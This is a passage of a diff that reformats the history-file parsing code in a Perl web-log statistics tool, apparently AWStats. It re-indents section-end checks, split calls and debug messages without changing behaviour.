+				  } until ( $field[0] eq 'END_UNKNOWNIP'
+					  || $field[0] eq "${xmleb}END_UNKNOWNIP"
+					  || !$_ );
+				if (   $field[0] ne 'END_UNKNOWNIP'
+					&& $field[0] ne "${xmleb}END_UNKNOWNIP" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section UNKOWNIP not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4319,7 +4378,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of UNKOWNIP section ($count entries, $countloaded loaded)"
+					debug(
+" End of UNKOWNIP section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'visitor'};
@@ -4373,14 +4433,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_LOGIN'
-							|| $field[0] eq "${xmleb}END_LOGIN"
-							|| !$_ );
-				if (    $field[0] ne 'END_LOGIN'
-					 && $field[0] ne "${xmleb}END_LOGIN" )
+				  } until ( $field[0] eq 'END_LOGIN'
+					  || $field[0] eq "${xmleb}END_LOGIN"
+					  || !$_ );
+				if (   $field[0] ne 'END_LOGIN'
+					&& $field[0] ne "${xmleb}END_LOGIN" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section LOGIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4388,7 +4448,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of LOGIN section ($count entries, $countloaded loaded)"
+					debug(
+" End of LOGIN section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'login'};
@@ -4435,14 +4496,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_DOMAIN'
-							|| $field[0] eq "${xmleb}END_DOMAIN"
-							|| !$_ );
-				if (    $field[0] ne 'END_DOMAIN'
-					 && $field[0] ne "${xmleb}END_DOMAIN" )
+				  } until ( $field[0] eq 'END_DOMAIN'
+					  || $field[0] eq "${xmleb}END_DOMAIN"
+					  || !$_ );
+				if (   $field[0] ne 'END_DOMAIN'
+					&& $field[0] ne "${xmleb}END_DOMAIN" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section DOMAIN not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4450,7 +4511,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of DOMAIN section ($count entries, $countloaded loaded)"
+					debug(
+" End of DOMAIN section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'domain'};
@@ -4490,14 +4552,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_SESSION'
-							|| $field[0] eq "${xmleb}END_SESSION"
-							|| !$_ );
-				if (    $field[0] ne 'END_SESSION'
-					 && $field[0] ne "${xmleb}END_SESSION" )
+				  } until ( $field[0] eq 'END_SESSION'
+					  || $field[0] eq "${xmleb}END_SESSION"
+					  || !$_ );
+				if (   $field[0] ne 'END_SESSION'
+					&& $field[0] ne "${xmleb}END_SESSION" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section SESSION not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4505,7 +4567,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of SESSION section ($count entries, $countloaded loaded)"
+					debug(
+" End of SESSION section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'session'};
@@ -4542,12 +4605,12 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_OS'
-							|| $field[0] eq "${xmleb}END_OS"
-							|| !$_ );
+				  } until ( $field[0] eq 'END_OS'
+					  || $field[0] eq "${xmleb}END_OS"
+					  || !$_ );
 				if ( $field[0] ne 'END_OS' && $field[0] ne "${xmleb}END_OS" ) {
 					error(
 "History file \"$filetoread\" is corrupted (End of section OS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4555,7 +4618,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of OS section ($count entries, $countloaded loaded)"
+					debug(
+" End of OS section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'os'};
@@ -4591,14 +4655,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_BROWSER'
-							|| $field[0] eq "${xmleb}END_BROWSER"
-							|| !$_ );
-				if (    $field[0] ne 'END_BROWSER'
-					 && $field[0] ne "${xmleb}END_BROWSER" )
+				  } until ( $field[0] eq 'END_BROWSER'
+					  || $field[0] eq "${xmleb}END_BROWSER"
+					  || !$_ );
+				if (   $field[0] ne 'END_BROWSER'
+					&& $field[0] ne "${xmleb}END_BROWSER" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section BROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4606,7 +4670,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of BROWSER section ($count entries, $countloaded loaded)"
+					debug(
+" End of BROWSER section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'browser'};
@@ -4643,14 +4708,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_UNKNOWNREFERER'
-							|| $field[0] eq "${xmleb}END_UNKNOWNREFERER"
-							|| !$_ );
-				if (    $field[0] ne 'END_UNKNOWNREFERER'
-					 && $field[0] ne "${xmleb}END_UNKNOWNREFERER" )
+				  } until ( $field[0] eq 'END_UNKNOWNREFERER'
+					  || $field[0] eq "${xmleb}END_UNKNOWNREFERER"
+					  || !$_ );
+				if (   $field[0] ne 'END_UNKNOWNREFERER'
+					&& $field[0] ne "${xmleb}END_UNKNOWNREFERER" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4658,7 +4723,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of UNKNOWNREFERER section ($count entries, $countloaded loaded)"
+					debug(
+" End of UNKNOWNREFERER section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'unknownreferer'};
@@ -4697,14 +4763,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_UNKNOWNREFERERBROWSER'
-							|| $field[0] eq "${xmleb}END_UNKNOWNREFERERBROWSER"
-							|| !$_ );
-				if (    $field[0] ne 'END_UNKNOWNREFERERBROWSER'
-					 && $field[0] ne "${xmleb}END_UNKNOWNREFERERBROWSER" )
+				  } until ( $field[0] eq 'END_UNKNOWNREFERERBROWSER'
+					  || $field[0] eq "${xmleb}END_UNKNOWNREFERERBROWSER"
+					  || !$_ );
+				if (   $field[0] ne 'END_UNKNOWNREFERERBROWSER'
+					&& $field[0] ne "${xmleb}END_UNKNOWNREFERERBROWSER" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section UNKNOWNREFERERBROWSER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4712,13 +4778,14 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of UNKNOWNREFERERBROWSER section ($count entries, $countloaded loaded)"
+					debug(
+" End of UNKNOWNREFERERBROWSER section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'unknownrefererbrowser'};
 				if ( $SectionsToSave{'unknownrefererbrowser'} ) {
 					Save_History( 'unknownrefererbrowser',
-								  $year, $month, $date );
+						$year, $month, $date );
 					delete $SectionsToSave{'unknownrefererbrowser'};
 					if ($withpurge) { %_unknownrefererbrowser_l = (); }
 				}
@@ -4749,14 +4816,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_SCREENSIZE'
-							|| $field[0] eq "${xmleb}END_SCREENSIZE"
-							|| !$_ );
-				if (    $field[0] ne 'END_SCREENSIZE'
-					 && $field[0] ne "${xmleb}END_SCREENSIZE" )
+				  } until ( $field[0] eq 'END_SCREENSIZE'
+					  || $field[0] eq "${xmleb}END_SCREENSIZE"
+					  || !$_ );
+				if (   $field[0] ne 'END_SCREENSIZE'
+					&& $field[0] ne "${xmleb}END_SCREENSIZE" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section SCREENSIZE not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4764,7 +4831,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of SCREENSIZE section ($count entries, $countloaded loaded)"
+					debug(
+" End of SCREENSIZE section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'screensize'};
@@ -4807,14 +4875,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_ROBOT'
-							|| $field[0] eq "${xmleb}END_ROBOT"
-							|| !$_ );
-				if (    $field[0] ne 'END_ROBOT'
-					 && $field[0] ne "${xmleb}END_ROBOT" )
+				  } until ( $field[0] eq 'END_ROBOT'
+					  || $field[0] eq "${xmleb}END_ROBOT"
+					  || !$_ );
+				if (   $field[0] ne 'END_ROBOT'
+					&& $field[0] ne "${xmleb}END_ROBOT" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section ROBOT not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4822,7 +4890,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of ROBOT section ($count entries, $countloaded loaded)"
+					debug(
+" End of ROBOT section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'robot'};
@@ -4867,14 +4936,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_WORMS'
-							|| $field[0] eq "${xmleb}END_WORMS"
-							|| !$_ );
-				if (    $field[0] ne 'END_WORMS'
-					 && $field[0] ne "${xmleb}END_WORMS" )
+				  } until ( $field[0] eq 'END_WORMS'
+					  || $field[0] eq "${xmleb}END_WORMS"
+					  || !$_ );
+				if (   $field[0] ne 'END_WORMS'
+					&& $field[0] ne "${xmleb}END_WORMS" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section WORMS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4882,7 +4951,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of WORMS section ($count entries, $countloaded loaded)"
+					debug(
+" End of WORMS section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'worms'};
@@ -4928,14 +4998,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_EMAILSENDER'
-							|| $field[0] eq "${xmleb}END_EMAILSENDER"
-							|| !$_ );
-				if (    $field[0] ne 'END_EMAILSENDER'
-					 && $field[0] ne "${xmleb}END_EMAILSENDER" )
+				  } until ( $field[0] eq 'END_EMAILSENDER'
+					  || $field[0] eq "${xmleb}END_EMAILSENDER"
+					  || !$_ );
+				if (   $field[0] ne 'END_EMAILSENDER'
+					&& $field[0] ne "${xmleb}END_EMAILSENDER" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section EMAILSENDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -4943,7 +5013,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of EMAILSENDER section ($count entries, $countloaded loaded)"
+					debug(
+" End of EMAILSENDER section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'emailsender'};
@@ -4989,14 +5060,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_EMAILRECEIVER'
-							|| $field[0] eq "${xmleb}END_EMAILRECEIVER"
-							|| !$_ );
-				if (    $field[0] ne 'END_EMAILRECEIVER'
-					 && $field[0] ne "${xmleb}END_EMAILRECEIVER" )
+				  } until ( $field[0] eq 'END_EMAILRECEIVER'
+					  || $field[0] eq "${xmleb}END_EMAILRECEIVER"
+					  || !$_ );
+				if (   $field[0] ne 'END_EMAILRECEIVER'
+					&& $field[0] ne "${xmleb}END_EMAILRECEIVER" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section EMAILRECEIVER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5004,7 +5075,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of EMAILRECEIVER section ($count entries, $countloaded loaded)"
+					debug(
+" End of EMAILRECEIVER section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'emailreceiver'};
@@ -5057,14 +5129,14 @@ sub Read_History_With_TmpUpdate {
 								{ # This is for $HTMLOutput = urldetail, urlentry or urlexit
 									if ( $MonthRequired eq 'all' ) {
 										if (
-											 (
-											   !$FilterIn{'url'}
-											   || $field[0] =~
-											   /$FilterIn{'url'}/
-											 )
-											 && ( !$FilterEx{'url'}
-												  || $field[0] !~
-												  /$FilterEx{'url'}/ )
+											(
+												!$FilterIn{'url'}
+												|| $field[0] =~
+												/$FilterIn{'url'}/
+											)
+											&& ( !$FilterEx{'url'}
+												|| $field[0] !~
+												/$FilterEx{'url'}/ )
 										  )
 										{
 											$loadrecord = 1;
@@ -5072,15 +5144,15 @@ sub Read_History_With_TmpUpdate {
 									}
 									else {
 										if (
-											 (
-											   !$FilterIn{'url'}
-											   || $field[0] =~
-											   /$FilterIn{'url'}/
-											 )
-											 && ( !$FilterEx{'url'}
-												  || $field[0] !~
-												  /$FilterEx{'url'}/ )
-											 && $field[1] >= $MinHit{'File'}
+											(
+												!$FilterIn{'url'}
+												|| $field[0] =~
+												/$FilterIn{'url'}/
+											)
+											&& ( !$FilterEx{'url'}
+												|| $field[0] !~
+												/$FilterEx{'url'}/ )
+											&& $field[1] >= $MinHit{'File'}
 										  )
 										{
 											$loadrecord = 1;
@@ -5115,14 +5187,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_SIDER'
-							|| $field[0] eq "${xmleb}END_SIDER"
-							|| !$_ );
-				if (    $field[0] ne 'END_SIDER'
-					 && $field[0] ne "${xmleb}END_SIDER" )
+				  } until ( $field[0] eq 'END_SIDER'
+					  || $field[0] eq "${xmleb}END_SIDER"
+					  || !$_ );
+				if (   $field[0] ne 'END_SIDER'
+					&& $field[0] ne "${xmleb}END_SIDER" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section SIDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5130,7 +5202,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of SIDER section ($count entries, $countloaded loaded)"
+					debug(
+" End of SIDER section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'sider'};
@@ -5176,14 +5249,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_FILETYPES'
-							|| $field[0] eq "${xmleb}END_FILETYPES"
-							|| !$_ );
-				if (    $field[0] ne 'END_FILETYPES'
-					 && $field[0] ne "${xmleb}END_FILETYPES" )
+				  } until ( $field[0] eq 'END_FILETYPES'
+					  || $field[0] eq "${xmleb}END_FILETYPES"
+					  || !$_ );
+				if (   $field[0] ne 'END_FILETYPES'
+					&& $field[0] ne "${xmleb}END_FILETYPES" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section FILETYPES not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5191,7 +5264,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of FILETYPES section ($count entries, $countloaded loaded)"
+					debug(
+" End of FILETYPES section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'filetypes'};
@@ -5270,14 +5344,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_SEREFERRALS'
-							|| $field[0] eq "${xmleb}END_SEREFERRALS"
-							|| !$_ );
-				if (    $field[0] ne 'END_SEREFERRALS'
-					 && $field[0] ne "${xmleb}END_SEREFERRALS" )
+				  } until ( $field[0] eq 'END_SEREFERRALS'
+					  || $field[0] eq "${xmleb}END_SEREFERRALS"
+					  || !$_ );
+				if (   $field[0] ne 'END_SEREFERRALS'
+					&& $field[0] ne "${xmleb}END_SEREFERRALS" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section SEREFERRALS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5285,7 +5359,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of SEREFERRALS section ($count entries, $countloaded loaded)"
+					debug(
+" End of SEREFERRALS section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'sereferrals'};
@@ -5320,14 +5395,14 @@ sub Read_History_With_TmpUpdate {
 							}
 							else {
 								if (
-									 (
-									   !$FilterIn{'refererpages'}
-									   || $field[0] =~
-									   /$FilterIn{'refererpages'}/
-									 )
-									 && ( !$FilterEx{'refererpages'}
-										  || $field[0] !~
-										  /$FilterEx{'refererpages'}/ )
+									(
+										!$FilterIn{'refererpages'}
+										|| $field[0] =~
+										/$FilterIn{'refererpages'}/
+									)
+									&& ( !$FilterEx{'refererpages'}
+										|| $field[0] !~
+										/$FilterEx{'refererpages'}/ )
 								  )
 								{
 									$loadrecord = 1;
@@ -5359,14 +5434,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_PAGEREFS'
-							|| $field[0] eq "${xmleb}END_PAGEREFS"
-							|| !$_ );
-				if (    $field[0] ne 'END_PAGEREFS'
-					 && $field[0] ne "${xmleb}END_PAGEREFS" )
+				  } until ( $field[0] eq 'END_PAGEREFS'
+					  || $field[0] eq "${xmleb}END_PAGEREFS"
+					  || !$_ );
+				if (   $field[0] ne 'END_PAGEREFS'
+					&& $field[0] ne "${xmleb}END_PAGEREFS" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section PAGEREFS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5374,7 +5449,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of PAGEREFS section ($count entries, $countloaded loaded)"
+					debug(
+" End of PAGEREFS section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'pagerefs'};
@@ -5393,7 +5469,8 @@ sub Read_History_With_TmpUpdate {
 			# BEGIN_SEARCHWORDS
 			if ( $field[0] eq 'BEGIN_SEARCHWORDS' ) {
 				if ($Debug) {
-					debug(             " Begin of SEARCHWORDS section ($MaxNbOf{'KeyphrasesShown'},$MinHit{'Keyphrase'})"
+					debug(
+" Begin of SEARCHWORDS section ($MaxNbOf{'KeyphrasesShown'},$MinHit{'Keyphrase'})"
 					);
 				}
 				$field[0] = '';
@@ -5414,9 +5491,9 @@ sub Read_History_With_TmpUpdate {
 									}
 									else {
 										if ( $countloaded <
-											    $MaxNbOf{'KeyphrasesShown'}
-											 && $field[1] >=
-											 $MinHit{'Keyphrase'} )
+											   $MaxNbOf{'KeyphrasesShown'}
+											&& $field[1] >=
+											$MinHit{'Keyphrase'} )
 										{
 											$loadrecord = 1;
 										}
@@ -5463,14 +5540,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_SEARCHWORDS'
-							|| $field[0] eq "${xmleb}END_SEARCHWORDS"
-							|| !$_ );
-				if (    $field[0] ne 'END_SEARCHWORDS'
-					 && $field[0] ne "${xmleb}END_SEARCHWORDS" )
+				  } until ( $field[0] eq 'END_SEARCHWORDS'
+					  || $field[0] eq "${xmleb}END_SEARCHWORDS"
+					  || !$_ );
+				if (   $field[0] ne 'END_SEARCHWORDS'
+					&& $field[0] ne "${xmleb}END_SEARCHWORDS" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section SEARCHWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5478,13 +5555,14 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of SEARCHWORDS section ($count entries, $countloaded loaded)"
+					debug(
+" End of SEARCHWORDS section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'searchwords'};
 				if ( $SectionsToSave{'searchwords'} ) {
 					Save_History( 'searchwords', $year, $month, $date );
-					delete $SectionsToSave{'searchwords'
+					delete $SectionsToSave{ 'searchwords'
 					  };    # This save searwords and keywords sections
 					if ($withpurge) { %_keyphrases = (); }
 				}
@@ -5498,7 +5576,8 @@ sub Read_History_With_TmpUpdate {
 			# BEGIN_KEYWORDS
 			if ( $field[0] eq 'BEGIN_KEYWORDS' ) {
 				if ($Debug) {
-					debug(             " Begin of KEYWORDS section ($MaxNbOf{'KeywordsShown'},$MinHit{'Keyword'})"
+					debug(
+" Begin of KEYWORDS section ($MaxNbOf{'KeywordsShown'},$MinHit{'Keyword'})"
 					);
 				}
 				$field[0] = '';
@@ -5511,8 +5590,8 @@ sub Read_History_With_TmpUpdate {
 							my $loadrecord = 0;
 							if ( $MonthRequired eq 'all' ) { $loadrecord = 1; }
 							else {
-								if (    $countloaded < $MaxNbOf{'KeywordsShown'}
-									 && $field[1] >= $MinHit{'Keyword'} )
+								if (   $countloaded < $MaxNbOf{'KeywordsShown'}
+									&& $field[1] >= $MinHit{'Keyword'} )
 								{
 									$loadrecord = 1;
 								}
@@ -5531,14 +5610,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_KEYWORDS'
-							|| $field[0] eq "${xmleb}END_KEYWORDS"
-							|| !$_ );
-				if (    $field[0] ne 'END_KEYWORDS'
-					 && $field[0] ne "${xmleb}END_KEYWORDS" )
+				  } until ( $field[0] eq 'END_KEYWORDS'
+					  || $field[0] eq "${xmleb}END_KEYWORDS"
+					  || !$_ );
+				if (   $field[0] ne 'END_KEYWORDS'
+					&& $field[0] ne "${xmleb}END_KEYWORDS" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section KEYWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5546,7 +5625,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of KEYWORDS section ($count entries, $countloaded loaded)"
+					debug(
+" End of KEYWORDS section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'keywords'};
@@ -5585,14 +5665,14 @@ sub Read_History_With_TmpUpdate {
 					chomp $_;
 					s/\r//;
 					@field =
-					  split( /\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ )
-					  );
+					  split( /\s+/,
+						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
 					$countlines++;
-				  } until (    $field[0] eq 'END_ERRORS'
-							|| $field[0] eq "${xmleb}END_ERRORS"
-							|| !$_ );
-				if (    $field[0] ne 'END_ERRORS'
-					 && $field[0] ne "${xmleb}END_ERRORS" )
+				  } until ( $field[0] eq 'END_ERRORS'
+					  || $field[0] eq "${xmleb}END_ERRORS"
+					  || !$_ );
+				if (   $field[0] ne 'END_ERRORS'
+					&& $field[0] ne "${xmleb}END_ERRORS" )
 				{
 					error(
 "History file \"$filetoread\" is corrupted (End of section ERRORS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
@@ -5600,7 +5680,8 @@ sub Read_History_With_TmpUpdate {
 					);
 				}
 				if ($Debug) {
-					debug(             " End of ERRORS section ($count entries, $countloaded loaded)"
+					debug(
+" End of ERRORS section ($count entries, $countloaded loaded)"
 					);
 				}
 				delete $SectionsToLoad{'errors'};
@@ -5643,19 +5724,19 @@ sub Read_History_With_TmpUpdate {
 						chomp $_;
 						s/\r//;
 						@field = split(
-										/\s+/,
-										(
-										   $readxml
